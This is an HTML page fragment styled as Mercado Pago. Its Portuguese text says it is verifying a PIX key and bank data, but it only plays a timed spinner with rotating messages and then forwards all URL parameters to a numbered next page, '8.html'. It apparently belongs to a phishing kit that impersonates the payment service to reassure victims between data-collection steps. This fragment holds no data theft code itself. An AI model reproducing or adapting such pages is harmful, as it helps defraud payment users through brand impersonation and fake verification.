    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'mp-blue': '#009EE3',
                        'mp-dark-blue': '#0074A8',
                        'mp-light-blue': '#E6F7FF',
                    }
                }
            }
        }
    </script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

        * {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: linear-gradient(135deg, #009EE3 0%, #0074A8 100%);
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 4px solid white;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .fade-in {
            animation: fadeIn 0.5s ease-out;
        }

        .loading-dots::after {
            content: '';
            animation: dots 1.5s steps(4, end) infinite;
        }

        @keyframes dots {
            0%, 20% { content: ''; }
            40% { content: '.'; }
            60% { content: '..'; }
            80%, 100% { content: '...'; }
        }
    </style>
</head>
<body>
    <main class="flex-1 flex items-center justify-center px-4">
        <div class="text-center text-white max-w-md mx-auto">
            <div class="mb-8">
                <img src="logo.png" alt="Mercado Pago" class="h-12 mx-auto opacity-90 mb-8">
            </div>

            <div class="spinner mx-auto mb-8"></div>

            <h1 id="loading-text" class="text-2xl md:text-3xl font-semibold mb-4 fade-in loading-dots">
                Verificando chave PIX
            </h1>

            <p class="text-lg opacity-90 fade-in">
                Aguarde enquanto processamos suas informações
            </p>
        </div>
    </main>

    <script>
        function iniciarCarregamento() {
            const frases = [
                "Verificando chave PIX",
                "Confirmando dados bancários",
                "Processando solicitação",
                "Validando informações",
            ];
            let fraseIndex = 0;
            const loadingText = document.getElementById('loading-text');

            const fraseInterval = setInterval(() => {
                fraseIndex = (fraseIndex + 1) % frases.length;
                loadingText.textContent = frases[fraseIndex];
                loadingText.classList.remove('fade-in');
                void loadingText.offsetWidth;
                loadingText.classList.add('fade-in');
            }, 1500);

            const urlParams = new URLSearchParams(window.location.search);
            setTimeout(() => {
                clearInterval(fraseInterval);

               window.location.href = `8.html?${urlParams.toString()}`;
            }, 6000);
        }

        iniciarCarregamento();
    </script>
</body>
